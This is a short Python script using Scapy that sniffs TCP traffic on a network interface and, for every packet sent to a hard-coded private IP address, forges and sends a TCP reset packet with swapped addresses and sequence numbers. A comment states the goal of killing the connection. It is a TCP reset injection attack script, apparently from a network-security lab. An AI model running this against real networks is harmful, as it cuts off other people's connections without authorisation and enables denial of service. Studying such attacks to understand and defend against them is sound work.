from scapy.all import *

target_ip = "192.168.13.30"

def pkt_callback(packet):
    if (TCP in packet):
        if (packet[IP].dst == target_ip):
            resetPkt = packet
            #set reset packet
            resetPkt[TCP].flags = 'R'
            #set ack number
            ack = resetPkt[TCP].ack
            seq = resetPkt[TCP].seq
            dst = resetPkt[IP].dst
            src = resetPkt[IP].src
            resetPkt[TCP].ack = seq
            resetPkt[TCP].seq = ack
            resetPkt[IP].src = dst
            resetPkt[IP].dst = src
            sendp(resetPkt)
            #now enumerate through possible sequence numbers to try and kill the connection


interface = "ens10"
sniff(iface=interface, prn=pkt_callback, filter="tcp", store=0)
